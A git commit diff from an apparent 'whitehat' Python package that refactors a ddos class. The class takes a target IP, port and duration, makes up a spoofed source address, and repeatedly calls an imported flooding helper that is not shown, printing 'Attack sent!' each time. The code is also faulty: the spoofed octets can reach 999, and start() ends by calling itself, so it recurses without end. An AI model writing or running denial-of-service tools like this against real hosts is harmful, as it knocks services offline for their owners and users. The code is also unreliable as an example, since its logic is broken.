d49b0919b876ca47bd5caeabd5a8978d188eb4c2
LyQuid :3 <83483788+LyQuid12@users.noreply.github.com>
2021-10-31 13:17:08 +0700

    Update ddos.py

--- whitehat/ddos.py
+++ whitehat/ddos.py
@@ -1,17 +1,25 @@
 import random
-from .utilities.ddos_util import *
+from .utilities.ddos_utils import *
 
 class ddos:
-    def target(IP, PORT, duration):
+    def __init__(self, IP, PORT, duration):
         ip1 = random.randint(100, 999)
         ip2 = random.randint(10, 999)
         ip3 = random.randint(10, 999)
         ip4 = random.randint(10, 999)
         fake_ip = f"{ip1}.{ip2}.{ip3}.{ip4}"
+        self.fake_ip = fake_ip
+        self.duration = duration
+        self.IP = IP
+        self.PORT = PORT
+    
+    
+    def start(self):
+        IP = self.IP
+        PORT = self.PORT
+        duration = self.duration
+        fake_ip = self.fake_ip
         for i in range(duration):
             ddos_util(IP=IP, PORT=PORT, fake_ip=fake_ip)
             print("Attack sent!")
-    
-    
-    def start(function):
-        function()
+        self.start()
